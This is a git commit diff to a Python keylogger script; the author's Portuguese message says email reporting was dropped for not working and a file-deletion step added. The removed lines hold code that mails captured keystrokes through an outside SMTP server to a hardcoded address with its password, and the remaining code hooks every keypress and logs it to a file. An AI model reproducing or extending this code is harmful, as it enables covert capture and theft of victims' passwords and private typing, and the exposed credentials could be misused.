105603a85a8c8e7076e75db1eab4e42de3b5aa5a
Gustavo Henrique <ymooncake@gmail.com>
2024-08-23 13:54:51 -0300

    Update Logger.py
    Tirei a função de enviar por email, não consegui fazer funcionar, e adicionei a função de excluir arquivos do computador

--- keylogger/logger.py
+++ keylogger/logger.py
@@ -1,22 +1,17 @@
 #!/usr/bin/env python
 import keyboard
-import smtplib
+import os
 from threading import Timer
 from datetime import datetime
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
 
 SEND_REPORT_EVERY = 60
-emailAddress = "reportsave82@gmail.com"
-password = "!Teste123"
 
 class Keylogger:
-    def __init__(self, interval, report_method="email"):
+    def __init__(self, interval):
         self.interval = interval
-        self.report_method = report_method
         self.log = ""
         self.start_dt = datetime.now()
-        self.end_dt = datetime.now()
+        self.filename = f"keylog-{self.start_dt.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
 
     def callback(self, event):
         if event.event_type == keyboard.KEY_DOWN:
@@ -29,59 +24,26 @@ class Keylogger:
             else:
                 self.log += f"[{event.name.upper()}]"
 
-    def update_filename(self):
-        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "-")
-        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "-")
-        self.filename = f"keylog-{start_dt_str}_{end_dt_str}.txt"
-
-    def report_to_file(self):
-        with open(f"{self.filename}", "w") as f:
-            f.write(self.log)
-        print(f"[+] Saved {self.filename}")
-
-    def prepare_email(self, message):
-        msg = MIMEMultipart("alternative")
-        msg["From"] = emailAddress
-        msg["To"] = emailAddress
-        msg["Subject"] = "Key Logs"
-        html = f"<p> {message}</p>"
-        text_part = MIMEText(message, "plain")
-        html_part = MIMEText(html, "html")
-        msg.attach(text_part)
-        msg.attach(html_part)
-        return msg.as_string()
-
-    def sendmail(self, email, password, message, verbose=1):
-        server = smtplib.SMTP(host="smtp.office365.com", port=587)
-        server.starttls()
-        server.login(email, password)
-        server.sendmail(email, email, self.prepare_email(message))
-        server.quit()
-        if verbose:
-            print(f"{datetime.now()} - Sent an email to {email} containing: {message}")
-
     def report(self):
         if self.log:
-            self.end_dt = datetime.now()
-            self.update_filename()
-            if self.report_method == "email":
-                self.sendmail(emailAddress, password, self.log)
-            elif self.report_method == "file":
-                self.report_to_file()
-            print(f"[{self.filename}] - {self.log}")
+            with open(self.filename, "w") as f:
+                f.write(self.log)
+            print(f"[+] Saved {self.filename}")
+            self.delete_file(self.filename)
             self.start_dt = datetime.now()
         self.log = ""
-        timer = Timer(interval=self.interval, function=self.report)
-        timer.daemon = True
-        timer.start()
+        Timer(self.interval, self.report).start()
+
+    def delete_file(self, filename):
+        os.remove(filename)
+        print(f"[+] Deleted {filename}")
 
     def start(self):
-        self.start_dt = datetime.now()
         keyboard.on_press(callback=self.callback)
         self.report()
         print(f"{datetime.now()} - Started Keylogger")
         keyboard.wait()
 
 if __name__ == "__main__":
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
     keylogger.start()
